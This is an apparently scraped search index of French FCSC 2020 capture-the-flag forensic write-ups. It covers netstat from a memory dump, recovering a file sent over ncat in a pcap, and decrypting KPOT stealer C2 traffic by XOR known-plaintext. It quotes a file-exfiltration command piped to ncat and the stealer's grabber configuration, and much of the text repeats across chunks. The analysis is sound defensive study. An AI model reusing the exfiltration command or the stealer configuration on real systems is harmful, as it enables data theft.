onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# python vol.py -f ../dmp/dmp.mem --profile=Linuxfcscdebianx64 linux_netstat |grep 'ESTAB' Volatility Foundation Volatility Framework 2.6.1 TCP 10.42.42.131 :36970 116.203.52.118 : 443 ESTABLISHED tor/706 TCP 10.42.42.131 :37252 163.172.182.147 : 443 ESTABLISHED tor/706 TCP fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED ncat/1515 TCP 10.42.42.131 :47106 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :55224 151.101.121.140 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :55226 151.101.121.140 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :53190 104.124.192.89 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :45652 35.190.72.21 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :47102 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :47104 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :38186 216.58.213.142 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :47100 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :50612 104.93.255.199 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :58772 185.199.111.154 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :38184 216.58.213.142 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :57000 10.42.42.134 : 22 ESTABLISHED ssh/119468 TCP fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED sh/119511 TCP 127.0.0.1 :38498 127.0.0.1 :34243 ESTABLISHED cli/119514 TCP 127.0.0.1 :34243 127.0.0.1 :38498 ESTABLISHED cli/119514 TCP 10.42.42.131 :51858 10.42.42.128 : 445 ESTABLISHED smbclient/119577 En one line : onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# python vol.py -f ../dmp/dmp.mem --profile=Linuxfcscdebianx64 linux_netstat |grep 'ESTAB' |awk -F' ' '{print $4}' |sort |uniq -c |wc -l 13 Nous avons 13 IPs destinations au total. Le flag : FCSC{pool-xfconfd:nmap -sS -sV 10.42.42.0/24:13}","title":"\u00c9tape 4 - Le nombre d'IP-DST"},{"location":"ctf/fcsc2020/cappcap/","text":"Cap ou pcap ? \u00c9nonc\u00e9 Voici la capture d\u2019une communication r\u00e9seau entre deux postes. Un fichier a \u00e9t\u00e9 \u00e9chang\u00e9 et vous devez le retrouver. Le flag est pr\u00e9sent dans le contenu du fichier. cap.pcap Analyse de la capture En ouvrant la capture nous remarquons des \u00e9changes TCP entre 2 h\u00f4tes. Au bout de la trame 6, des informations relatives \u00e0 un syst\u00e8me linux apparaissent, j'ouvre le flux TCP sur cette trame. id uid=1001(fcsc) gid=1001(fcsc) groups=1001(fcsc) pwd /home/fcsc 07:10:25 up 24 min, 1 user, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT fcsc tty7 :0 06:46 24:47 3.13s 0.00s /bin/sh /etc/xdg/xfce4/xinitrc -- /etc/X11/xinit/xserverrc ls Desktop Documents Downloads Music Pictures Public Templates Videos ls Documents flag.zip file Documents/flag.zip Documents/flag.zip: Zip archive data, at least v2.0 to extract xxd -p Documents/flag.zip | tr -d '\\n' | ncat 172.20.20.133 20200 exit La commande pour l'\u00e9change du fichier est : xxd -p Documents/flag.zip | tr -d '\\n' | ncat 172.20.20.133 20200 On regarde rapidement le manuel de xxd sous linux : xxd -p output in postscript plain hexdump style La commande r\u00e9cupere le hexdump de flag.zip, supprime les retours \u00e0 la ligne avec tr et transfert le fichier avec ncat. Cherchons les donn\u00e9es du fichiers dans les trames, notamment la trame la plus \"grosse\". La trame 27 contient les donn\u00e9es relatives \u00e0 l'\u00e9changes : 504b0304140000000800a231825065235c39420000004700000008001c00666c61672e7478745554090003bfc8855ebfc8855e75780b000104e803000004e80300000dc9c11180300804c0bfd5840408bc33630356e00568c2b177ddef9eeb5a8fe6ee06ce8e5684f0845997192aad44ecaedc7f8e1acc4e3ec1a8eda164d48c28c77b7c504b01021e03140000000800a231825065235c394200000047000000080018000000000001000000a48100000000666c61672e7478745554050003bfc8855e75780b000104e803000004e8030000504b050600000000010001004e000000840000000000 Il ne reste plus qu'\u00e0 faire le processus inverse. onosh@kali:/home/onosh/FCSC/CRYPTO# xxd -r -p flag.hex >flag.zip && unzip flag.zip flag.txt && cat flag.txt Archive: flag.zip inflating: flag.txt FCSC{6ec28b4e2b0f1bd9eb88257d650f558afec4e23f3449197b4bfc9d61810811e3}","title":"CapPcap"},{"location":"ctf/fcsc2020/cappcap/#cap-ou-pcap","text":"","title":"Cap ou pcap ?"},{"location":"ctf/fcsc2020/cappcap/#enonce","text":"Voici la capture d\u2019une communication r\u00e9seau entre deux postes. Un fichier a \u00e9t\u00e9 \u00e9chang\u00e9 et vous devez le retrouver. Le flag est pr\u00e9sent dans le contenu du fichier. cap.pcap","title":"\u00c9nonc\u00e9"},{"location":"ctf/fcsc2020/cappcap/#analyse-de-la-capture","text":"En ouvrant la capture nous remarquons des \u00e9changes TCP entre 2 h\u00f4tes. Au bout de la trame 6, des informations relatives \u00e0 un syst\u00e8me linux apparaissent, j'ouvre le flux TCP sur cette trame. id uid=1001(fcsc) gid=1001(fcsc) groups=1001(fcsc) pwd /home/fcsc 07:10:25 up 24 min, 1 user, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT fcsc tty7 :0 06:46 24:47 3.13s 0.00s /bin/sh /etc/xdg/xfce4/xinitrc -- /etc/X11/xinit/xserverrc ls Desktop Documents Downloads Music Pictures Public Templates Videos ls Documents flag.zip file Documents/flag.zip Documents/flag.zip: Zip archive data, at least v2.0 to extract xxd -p Documents/flag.zip | tr -d '\\n' | ncat 172.20.20.133 20200 exit La commande pour l'\u00e9change du fichier est : xxd -p Documents/flag.zip | tr -d '\\n' | ncat 172.20.20.133 20200 On regarde rapidement le manuel de xxd sous linux : xxd -p output in postscript plain hexdump style La commande r\u00e9cupere le hexdump de flag.zip, supprime les retours \u00e0 la ligne avec tr et transfert le fichier avec ncat. Cherchons les donn\u00e9es du fichiers dans les trames, notamment la trame la plus \"grosse\". La trame 27 contient les donn\u00e9es relatives \u00e0 l'\u00e9changes : 504b0304140000000800a231825065235c39420000004700000008001c00666c61672e7478745554090003bfc8855ebfc8855e75780b000104e803000004e80300000dc9c11180300804c0bfd5840408bc33630356e00568c2b177ddef9eeb5a8fe6ee06ce8e5684f0845997192aad44ecaedc7f8e1acc4e3ec1a8eda164d48c28c77b7c504b01021e03140000000800a231825065235c394200000047000000080018000000000001000000a48100000000666c61672e7478745554050003bfc8855e75780b000104e803000004e8030000504b050600000000010001004e000000840000000000 Il ne reste plus qu'\u00e0 faire le processus inverse. onosh@kali:/home/onosh/FCSC/CRYPTO# xxd -r -p flag.hex >flag.zip && unzip flag.zip flag.txt && cat flag.txt Archive: flag.zip inflating: flag.txt FCSC{6ec28b4e2b0f1bd9eb88257d650f558afec4e23f3449197b4bfc9d61810811e3}","title":"Analyse de la capture"},{"location":"ctf/fcsc2020/chapardeur/","text":"Chapardeur de mots de passe \u00c9nonc\u00e9 : Un ami vous demande de l'aide pour d\u00e9terminer si l'email qu'il vient d'ouvrir au sujet du Covid-19 \u00e9tait malveillant et si c'\u00e9tait le cas, ce qu'il risque. Il pr\u00e9tend avoir essay\u00e9 d'ouvrir le fichier joint \u00e0 cet mail sans y parvenir. Peu de temps apr\u00e8s, une fen\u00eatre li\u00e9e \u00e0 l'anti-virus a indiqu\u00e9, entre autre, le mot KPOT v2.0 mais rien d'apparent n'est arriv\u00e9 en dehors de cela. Apr\u00e8s une analyse pr\u00e9liminaire, votre ami vous informe qu'il est probable que ce malware ait \u00e9t\u00e9 l\u00e9g\u00e8rement modifi\u00e9, \u00e9tant donn\u00e9 que le contenu potentiellement exfiltr\u00e9 (des parties du format de texte et de fichier avant chiffrement) ne semble plus pr\u00e9dictible. Il vous recommande donc de chercher d'autres \u00e9l\u00e9ments pour parvenir \u00e0 l'aider. Vous disposez d'une capture r\u00e9seau de son trafic pour l'aider \u00e0 d\u00e9terminer si des donn\u00e9es ont bien \u00e9t\u00e9 vol\u00e9es et lui dire s'il doit rapidement changer ses mots de passe ! pws.pcap.zip ~500Mo \u00c9tape 1 - Recherche sur le malware Pour commencer, nous t\u00e9l\u00e9chargeons la capture de trames de ~500Mo. Cela nous laisse le temps de chercher quelques informations sur le malware KPOT v2.0. Je tombe sur 2 sites : https://www.proofpoint.com/us/threat-insight/post/new-kpot-v20-stealer-brings-zero-persistence-and-memory-features-silently-steal https://labs.sentinelone.com/info-stealers-how-malware-hacks-private-user-data/ On apprend que le malware contamine les victimes g\u00e9n\u00e9ralement par des attaques phishing \u00e0 partir de la pi\u00e8ce jointe. Kpot utilise http pour ag\u00eer, il communique avec un serveur distant pour l'informer de l'infection d'un poste. Il envoie une requ\u00eate GET \u00e0 destination d'un serveur de ce type: http://lesitemalveillant.ru/lmpUNlwDfoybeulu/gate.php La r\u00e9ponse du serveur est encod\u00e9 en base64 et XOR'd avec une cl\u00e9 stock\u00e9 sous forme de cha\u00eene. Voici un exemple d'\u00e9chantillon d\u00e9ja analys\u00e9 : 1111111111111100__DELIMM__A.B.C.D__DELIMM__appdata__GRABBER__*.log,*.txt,__GRABBER__%appdata%__GRABBER__0__GRABBER__1024__DELIMM__desktop_txt__GRABBER__*.txt,__GRABBER__%userprofile%\\Desktop__GRABBER__0__GRABBER__150__DELIMM____DELIMM____DELIMM__ Les donn\u00e9es contenu dans cette r\u00e9ponse sont d\u00e9limit\u00e9es par \" DELIMM \" et sont r\u00e9parties selon le type de donn\u00e9es suivant : Une cha\u00eene de bit indiquant les commandes \u00e0 \u00e9x\u00e9cuter L'adresse ip de la victime Les r\u00e8gles GRABBER pr\u00e9cisant les fichiers \u00e0 rechercher et exfiltrer Le premier composant de la r\u00e9ponse ci dessus est une cha\u00eene de 16 bits. Chaque 1 active une fonctionnalit\u00e9, 0 la d\u00e9sactive. Voici une liste de quelques fonctionnalit\u00e9s : Voler les cookies, les mots de passe de Chrome Voler les cookies, les mots de passe de Firefox Voler les cookies, les mot de passe d'Internet Explorer Voler les comptes Skype Voler les comptes de T\u00e9l\u00e9gram Voler des comptes Discord Volez les comptes Steam Prendre une capture d'\u00e9cran Voler divers comptes clients FTP Se supprimer lui m\u00eame R\u00e9cup\u00e9rer un fichier en fonction de son extension, sa taille, son path Enfin ! La capture de trames est t\u00e9l\u00e9charg\u00e9. Maintenant que nous avons une vision sur le fonctionnement g\u00e9n\u00e9ral du malware, commen\u00e7ons \u00e0 l'analyser ! \u00c9tape 2 - La communication post-infection Vu le contexte du challenge, je commence par chercher des trames en rapport avec la pi\u00e8ce jointe t\u00e9l\u00e9charger par notre ami, mais RAS. Je passe donc \u00e0 la recherche de la requ\u00eate GET envoy\u00e9 au serveur malveillant sur le fichier cibl\u00e9 \"gate.php\". onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# tshark -r pws.pcap http.request.method == \"GET\" |grep -iH 'gate.php' 2656 37.377541 192.168.4.129 \u2192 198.54.117.197 HTTP 217 GET /lmpUNlwDfoybeulu/gate.php HTTP/1.1 3251 39.543285 192.168.4.129 \u2192 104.27.140.49 HTTP 218 GET /o96xEVtEmxfoYNxf/gate.php HTTP/1.1 6138 41.601461 192.168.4.129 \u2192 185.25.51.81 HTTP 217 GET /WjXxdpfqDyEE45gr/gate.php HTTP/1.1 7174 44.655584 192.168.4.129 \u2192 203.0.113.42 HTTP 230 GET /Ym9ubmVfcGlzdGVf/gate.php HTTP/1.1 On tombe sur 4 requ\u00eates, voyons voir la quelle \u00e0 r\u00e9pondu par OK \u00e0 cette demande ! onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# tshark -r pws.pcap http.response |egrep '(198.54.117.197|104.27.140.49|185.25.51.81|203.0.113.42)' 2658 37.533943 198.54.117.197 \u2192 192.168.4.129 HTTP 380 HTTP/1.1 403 Forbidden (text/html) 3253 39.548535 104.27.140.49 \u2192 192.168.4.129 HTTP 530 HTTP/1.1 403 Forbidden (text/plain) 6186 41.650472 185.25.51.81 \u2192 192.168.4.129 HTTP 1460 HTTP/1.1 404 Not Found (text/html) 7176 44.656395 203.0.113.42 \u2192 192.168.4.129 HTTP 603 HTTP/1.1 200 OK (text/html) 11616 47.662486 203.0.113.42 \u2192 192.168.4.129 HTTP 267 HTTP/1.1 200 OK (text/html) Le serveur en 203.0.113.42 a l'air d'\u00eatre le bon candidat. R\u00e9cup\u00e9rons le contenu de sa r\u00e9ponse : onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# tshark -r pws.pcap -T fields -e http.file_data frame.number eq 7176 RHVdQ1V8BFVHAgRSAGNZRisbKDYoBXgpKW0HUgl8WUZMal1HXWIGU0Vtaid0HiE7ORszEhQ8UQUCU2o8dgApNDYBPiw7ZhsIGVUZSR8mEAJYGzM0Ng13JjNgajwUMxgGECUYEkETaiMkc3chdAA3KUQbMzQ2DXcmM2BqPABiWkIrGyg2KAV4KSltUQZCORwZBBsYCxATaiMkc3chdAA3KV5qGAsQYGo7MWB0IXMXOikrYRkAAT5FFhlUXA9UdzQyETcHBws8ajsxYHQhcxc6KSt0MywjHnQmNHdnPG5iNykwASA6KQFqOyltcSZ9GyU7KxszLCAJeS07f2o8 D'apr\u00e8s la documentation sur le malware, les donn\u00e9es ont \u00e9t\u00e9 encod\u00e9 en base64 puis XOR'd \u00e0 l'aide d'une cl\u00e9, cependant nous n'avons pas cette cl\u00e9... \u00c9tape 3 - La cl\u00e9 XOR Quelques types d'attaques sont connues avec XOR : plaintext \u2295 key = encrypted_text encrypted_text \u2295 plaintext = key encrypted_text \u2295 key = plaintext Ici nous avons des donn\u00e9es chiffr\u00e9es, pas de cl\u00e9, mais nous connaissons les potentiels donn\u00e9es qui pourraient se trouver \u00e0 l'int\u00e9rieur (GRABBER, DELIM etc...). Apr\u00e8s quelque recherche je trouve un tool capable de g\u00e9rer cette attaque : https://blog.didierstevens.com/2017/06/06/update-xor-kpa-py-version-0-0-5/. La description de son fonctionnement est ici : https://isc.sans.edu/forums/diary/Malware+and+XOR+Part+1/22486/ https://isc.sans.edu/forums/diary/Malware+and+XOR+Part+2/22490/ Il ne reste plus qu'\u00e0 tester ! L'outil xor-kpa.py prend 2 fichiers en entr\u00e9e : Le premier fichier contient le texte en clair, et le second le fichier encod\u00e9. Dans son exemple, Monsieur Didier Stevens recherche la cha\u00eene \"This program cannot be run in DOS mode\" contenu g\u00e9n\u00e9ralement dans les \u00e9x\u00e9cutables. Son programme est d'ailleurs adapt\u00e9s pour travailler avec cette cha\u00eene, mais nous cela ne nous int\u00e9resse pas. Notre texte en clair est compos\u00e9 de : 1111111111111100__DELIMM__A.B.C.D__DELIMM__appdata__GRABBER__*.log,*.txt,__GRABBER__%appdata%__GRABBER__0__GRABBER__1024__DELIMM__desktop_txt__GRABBER__*.txt,__GRABBER__%userprofile%\\Desktop__GRABBER__0__GRABBER__150__DELIMM____DELIMM____DELIMM__ Prenons un \u00e9chantillon ! Je d\u00e9cide de modifier le script xor-kpa.py : onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# grep -inH --color 'dos' xor-kpa.py xor-kpa.py:42:dPlaintext = {'dos': 'This program cannot be run in DOS mode'} Je remplace This program cannot be run in DOS mode par GRABBER__0__GRABBER__1024 Le script ne prend pas en compte l'encodage base64, je d\u00e9code donc la cha\u00eene onosh@kali#:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# base64 -d enc.b64 >ciph.txt Je lance le script en indiquant que nous recherchons le plaintext contenu dans la variable dos dans le contenu du fichier cipher.txt onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# ./custom.py -n dos ciph.txt Key: '!\\x053s2Uxly>F0^a\\x02DX\\x16\\x1eJ\\x06(k\\x03' Key (hex): 0x210533733255786c793e46305e61024458161e4a06286b03 Extra: 1 Divide: 1 Counts: 1 Keystream: '3s2Uxly>F0^a\\x02DX\\x16\\x1eJ\\x06(k\\x03!\\x053' Key: 'f+lMSn\\x10G@\\x168c)1\\x19\\x06\\x02?+e6[sd' Key (hex): 0x662b6c4d536e10474016386329311906023f2b65365b7364 Extra: 1 Divide: 1 Counts: 1 Keystream: '\\x02?+e6[sdf+lMSn\\x10G@\\x168c)1\\x19\\x06\\x02' Key: tDlsdL5dv25c1Rhv Key (hex): 0x74446c73644c35647632356331526876 Extra: 9 Divide: 1 Counts: 1 Keystream: dv25c1RhvtDlsdL5dv25c1Rhv Nous voil\u00e0 maintenant avec 3 cl\u00e9s ! D'apr\u00e8s les deux sites que l'on a vu au d\u00e9but expliquant le fonctionnement du malware, la cl\u00e9 fait g\u00e9n\u00e9ralement 16 bits, oh ! comme la derni\u00e8re :) La cl\u00e9 XOR serait donc : tDlsdL5dv25c1Rhv \ud83c\udf40 Nous retrouvons donc bien le texte en clair en utilisant cette cl\u00e9 : 0110101110111110__DELIMM__218.108.149.373__DELIMM__appdata__GRABBER__*.log,*.txt,__GRABBER__%appdata%__GRABBER__0__GRABBER__1024__DELIMM__desktop_txt__GRABBER__*.txt,__GRABBER__%userprofile%\\Desktop__GRABBER__0__GRABBER__0__DELIMM____DELIMM____DELIMM__ Maintenant analysons la requ\u00eate POST envoy\u00e9 au serveur, cette requ\u00eate exfiltre les donn\u00e9es en utilisant la cl\u00e9 XOR. onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# tshark -r pws.pcap http.request |egrep '203.0.113.42' 11614 47.662486 192.168.4.129 \u2192 203.0.113.42 HTTP 267 HTTP/1.1 200 POST (text/html) onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# tshark -r pws.pcap -T fields -e http.file_data frame.number eq 11614 Nous r\u00e9cup\u00e9rons le r\u00e9sultat en hexa : 2b003e3234097431296249164260181301363d06017e78501a13154363661b0501365f09491a5a10045718225c63453300691a1c552f04321946470655205c061125192c220f66277c49015508375047427c5b425c750c5213510d50506b5a1717205a15017a575d1502060007310d1246255f125329020544020d5a53675b4216250d165d7b54530b386a2763133833351133 M\u00eame manipulation que toute \u00e0 l'heure pour d\u00e9chiffrer les donn\u00e9es _DRAPEAU_P|us2peurQue2M4l! R4ssur3z-Votre-Am1-Et-vo1c1Votredr4peau_FCSC {469e8168718996ec83a92acd6fe6b9c03c6ced2a3a7e7a2089b534baae97a7} _DRAPEAU_","title":"Chapardeur"},{"location":"ctf/fcsc2020/chapardeur/#chapardeur-de-mots-de-passe","text":"","title":"Chapardeur de mots de passe"},{"location":"ctf/fcsc2020/chapardeur/#enonce","text":"Un ami vous demande de l'aide pour d\u00e9terminer si l'email qu'il vient d'ouvrir au sujet du Covid-19 \u00e9tait malveillant et si c'\u00e9tait le cas, ce qu'il risque. Il pr\u00e9tend avoir essay\u00e9 d'ouvrir le fichier joint \u00e0 cet mail sans y parvenir. Peu de temps apr\u00e8s, une fen\u00eatre li\u00e9e \u00e0 l'anti-virus a indiqu\u00e9, entre autre, le mot KPOT v2.0 mais rien d'apparent n'est arriv\u00e9 en dehors de cela. Apr\u00e8s une analyse pr\u00e9liminaire, votre ami vous informe qu'il est probable que ce malware ait \u00e9t\u00e9 l\u00e9g\u00e8rement modifi\u00e9, \u00e9tant donn\u00e9 que le contenu potentiellement exfiltr\u00e9 (des parties du format de texte et de fichier avant chiffrement) ne semble plus pr\u00e9dictible. Il vous recommande donc de chercher d'autres \u00e9l\u00e9ments pour parvenir \u00e0 l'aider. Vous disposez d'une capture r\u00e9seau de son trafic pour l'aider \u00e0 d\u00e9terminer si des donn\u00e9es ont bien \u00e9t\u00e9 vol\u00e9es et lui dire s'il doit rapidement changer ses mots de passe ! pws.pcap.zip ~500Mo","title":"\u00c9nonc\u00e9 :"},{"location":"ctf/fcsc2020/chapardeur/#etape-1-recherche-sur-le-malware","text":"Pour commencer, nous t\u00e9l\u00e9chargeons la capture de trames de ~500Mo. Cela nous laisse le temps de chercher quelques informations sur le malware KPOT v2.0. Je tombe sur 2 sites : https://www.proofpoint.com/us/threat-insight/post/new-kpot-v20-stealer-brings-zero-persistence-and-memory-features-silently-steal https://labs.sentinelone.com/info-stealers-how-malware-hacks-private-user-data/ On apprend que le malware contamine les victimes g\u00e9n\u00e9ralement par des attaques phishing \u00e0 partir de la pi\u00e8ce jointe. Kpot utilise http pour ag\u00eer, il communique avec un serveur distant pour l'informer de l'infection d'un poste. Il envoie une requ\u00eate GET \u00e0 destination d'un serveur de ce type: http://lesitemalveillant.ru/lmpUNlwDfoybeulu/gate.php La r\u00e9ponse du serveur est encod\u00e9 en base64 et XOR'd avec une cl\u00e9 stock\u00e9 sous forme de cha\u00eene. Voici un exemple d'\u00e9chantillon d\u00e9ja analys\u00e9 : 1111111111111100__DELIMM__A.B.C.D__DELIMM__appdata__GRABBER__*.log,*.txt,__GRABBER__%appdata%__GRABBER__0__GRABBER__1024__DELIMM__desktop_txt__GRABBER__*.txt,__GRABBER__%userprofile%\\Desktop__GRABBER__0__GRABBER__150__DELIMM____DELIMM____DELIMM__ Les donn\u00e9es contenu dans cette r\u00e9ponse sont d\u00e9limit\u00e9es par \" DELIMM \" et sont r\u00e9parties selon le type de donn\u00e9es suivant : Une cha\u00eene de bit indiquant les commandes \u00e0 \u00e9x\u00e9cuter L'adresse ip de la victime Les r\u00e8gles GRABBER pr\u00e9cisant les fichiers \u00e0 rechercher et exfiltrer Le premier composant de la r\u00e9ponse ci dessus est une cha\u00eene de 16 bits. Chaque 1 active une fonctionnalit\u00e9, 0 la d\u00e9sactive. Voici une liste de quelques fonctionnalit\u00e9s : Voler les cookies, les mots de passe de Chrome Voler les cookies, les mots de passe de Firefox Voler les cookies, les mot de passe d'Internet Explorer Voler les comptes Skype Voler les comptes de T\u00e9l\u00e9gram Voler des comptes Discord Volez les comptes Steam Prendre une capture d'\u00e9cran Voler divers comptes clients FTP Se supprimer lui m\u00eame R\u00e9cup\u00e9rer un fichier en fonction de son extension, sa taille, son path Enfin ! La capture de trames est t\u00e9l\u00e9charg\u00e9. Maintenant que nous avons une vision sur le fonctionnement g\u00e9n\u00e9ral du malware, commen\u00e7ons \u00e0 l'analyser !","title":"\u00c9tape 1 - Recherche sur le malware"},{"location":"ctf/fcsc2020/chapardeur/#etape-2-la-communication-post-infection","text":"Vu le contexte du challenge, je commence par chercher des trames en rapport avec la pi\u00e8ce jointe t\u00e9l\u00e9charger par notre ami, mais RAS. Je passe donc \u00e0 la recherche de la requ\u00eate GET envoy\u00e9 au serveur malveillant sur le fichier cibl\u00e9 \"gate.php\". onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# tshark -r pws.pcap http.request.method == \"GET\" |grep -iH 'gate.php' 2656 37.377541 192.168.4.129 \u2192 198.54.117.197 HTTP 217 GET /lmpUNlwDfoybeulu/gate.php HTTP/1.1 3251 39.543285 192.168.4.129 \u2192 104.27.140.49 HTTP 218 GET /o96xEVtEmxfoYNxf/gate.php HTTP/1.1 6138 41.601461 192.168.4.129 \u2192 185.25.51.81 HTTP 217 GET /WjXxdpfqDyEE45gr/gate.php HTTP/1.1 7174 44.655584 192.168.4.129 \u2192 203.0.113.42 HTTP 230 GET /Ym9ubmVfcGlzdGVf/gate.php HTTP/1.1 On tombe sur 4 requ\u00eates, voyons voir la quelle \u00e0 r\u00e9pondu par OK \u00e0 cette demande ! onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# tshark -r pws.pcap http.response |egrep '(198.54.117.197|104.27.140.49|185.25.51.81|203.0.113.42)' 2658 37.533943 198.54.117.197 \u2192 192.168.4.129 HTTP 380 HTTP/1.1 403 Forbidden (text/html) 3253 39.548535 104.27.140.49 \u2192 192.168.4.129 HTTP 530 HTTP/1.1 403 Forbidden (text/plain) 6186 41.650472 185.25.51.81 \u2192 192.168.4.129 HTTP 1460 HTTP/1.1 404 Not Found (text/html) 7176 44.656395 203.0.113.42 \u2192 192.168.4.129 HTTP 603 HTTP/1.1 200 OK (text/html) 11616 47.662486 203.0.113.42 \u2192 192.168.4.129 HTTP 267 HTTP/1.1 200 OK (text/html) Le serveur en 203.0.113.42 a l'air d'\u00eatre le bon candidat. R\u00e9cup\u00e9rons le contenu de sa r\u00e9ponse : onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# tshark -r pws.pcap -T fields -e http.file_data frame.number eq 7176 RHVdQ1V8BFVHAgRSAGNZRisbKDYoBXgpKW0HUgl8WUZMal1HXWIGU0Vtaid0HiE7ORszEhQ8UQUCU2o8dgApNDYBPiw7ZhsIGVUZSR8mEAJYGzM0Ng13JjNgajwUMxgGECUYEkETaiMkc3chdAA3KUQbMzQ2DXcmM2BqPABiWkIrGyg2KAV4KSltUQZCORwZBBsYCxATaiMkc3chdAA3KV5qGAsQYGo7MWB0IXMXOikrYRkAAT5FFhlUXA9UdzQyETcHBws8ajsxYHQhcxc6KSt0MywjHnQmNHdnPG5iNykwASA6KQFqOyltcSZ9GyU7KxszLCAJeS07f2o8 D'apr\u00e8s la documentation sur le malware, les donn\u00e9es ont \u00e9t\u00e9 encod\u00e9 en base64 puis XOR'd \u00e0 l'aide d'une cl\u00e9, cependant nous n'avons pas cette cl\u00e9...","title":"\u00c9tape 2 - La communication post-infection"},{"location":"ctf/fcsc2020/chapardeur/#etape-3-la-cle-xor","text":"Quelques types d'attaques sont connues avec XOR : plaintext \u2295 key = encrypted_text encrypted_text \u2295 plaintext = key encrypted_text \u2295 key = plaintext Ici nous avons des donn\u00e9es chiffr\u00e9es, pas de cl\u00e9, mais nous connaissons les potentiels donn\u00e9es qui pourraient se trouver \u00e0 l'int\u00e9rieur (GRABBER, DELIM etc...). Apr\u00e8s quelque recherche je trouve un tool capable de g\u00e9rer cette attaque : https://blog.didierstevens.com/2017/06/06/update-xor-kpa-py-version-0-0-5/. La description de son fonctionnement est ici : https://isc.sans.edu/forums/diary/Malware+and+XOR+Part+1/22486/ https://isc.sans.edu/forums/diary/Malware+and+XOR+Part+2/22490/ Il ne reste plus qu'\u00e0 tester ! L'outil xor-kpa.py prend 2 fichiers en entr\u00e9e : Le premier fichier contient le texte en clair, et le second le fichier encod\u00e9. Dans son exemple, Monsieur Didier Stevens recherche la cha\u00eene \"This program cannot be run in DOS mode\" contenu g\u00e9n\u00e9ralement dans les \u00e9x\u00e9cutables. Son programme est d'ailleurs adapt\u00e9s pour travailler avec cette cha\u00eene, mais nous cela ne nous int\u00e9resse pas. Notre texte en clair est compos\u00e9 de : 1111111111111100__DELIMM__A.B.C.D__DELIMM__appdata__GRABBER__*.log,*.txt,__GRABBER__%appdata%__GRABBER__0__GRABBER__1024__DELIMM__desktop_txt__GRABBER__*.txt,__GRABBER__%userprofile%\\Desktop__GRABBER__0__GRABBER__150__DELIMM____DELIMM____DELIMM__ Prenons un \u00e9chantillon ! Je d\u00e9cide de modifier le script xor-kpa.py : onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# grep -inH --color 'dos' xor-kpa.py xor-kpa.py:42:dPlaintext = {'dos': 'This program cannot be run in DOS mode'} Je remplace This program cannot be run in DOS mode par GRABBER__0__GRABBER__1024 Le script ne prend pas en compte l'encodage base64, je d\u00e9code donc la cha\u00eene onosh@kali#:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# base64 -d enc.b64 >ciph.txt Je lance le script en indiquant que nous recherchons le plaintext contenu dans la variable dos dans le contenu du fichier cipher.txt onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# ./custom.py -n dos ciph.txt Key: '!\\x053s2Uxly>F0^a\\x02DX\\x16\\x1eJ\\x06(k\\x03' Key (hex): 0x210533733255786c793e46305e61024458161e4a06286b03 Extra: 1 Divide: 1 Counts: 1 Keystream: '3s2Uxly>F0^a\\x02DX\\x16\\x1eJ\\x06(k\\x03!\\x053' Key: 'f+lMSn\\x10G@\\x168c)1\\x19\\x06\\x02?+e6[sd' Key (hex): 0x662b6c4d536e10474016386329311906023f2b65365b7364 Extra: 1 Divide: 1 Counts: 1 Keystream: '\\x02?+e6[sdf+lMSn\\x10G@\\x168c)1\\x19\\x06\\x02' Key: tDlsdL5dv25c1Rhv Key (hex): 0x74446c73644c35647632356331526876 Extra: 9 Divide: 1 Counts: 1 Keystream: dv25c1RhvtDlsdL5dv25c1Rhv Nous voil\u00e0 maintenant avec 3 cl\u00e9s ! D'apr\u00e8s les deux sites que l'on a vu au d\u00e9but expliquant le fonctionnement du malware, la cl\u00e9 fait g\u00e9n\u00e9ralement 16 bits, oh ! comme la derni\u00e8re :) La cl\u00e9 XOR serait donc : tDlsdL5dv25c1Rhv \ud83c\udf40 Nous retrouvons donc bien le texte en clair en utilisant cette cl\u00e9 : 0110101110111110__DELIMM__218.108.149.373__DELIMM__appdata__GRABBER__*.log,*.txt,__GRABBER__%appdata%__GRABBER__0__GRABBER__1024__DELIMM__desktop_txt__GRABBER__*.txt,__GRABBER__%userprofile%\\Desktop__GRABBER__0__GRABBER__0__DELIMM____DELIMM____DELIMM__ Maintenant analysons la requ\u00eate POST envoy\u00e9 au serveur, cette requ\u00eate exfiltre les donn\u00e9es en utilisant la cl\u00e9 XOR. onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# tshark -r pws.pcap http.request |egrep '203.0.113.42' 11614 47.662486 192.168.4.129 \u2192 203.0.113.42 HTTP 267 HTTP/1.1 200 POST (text/html) 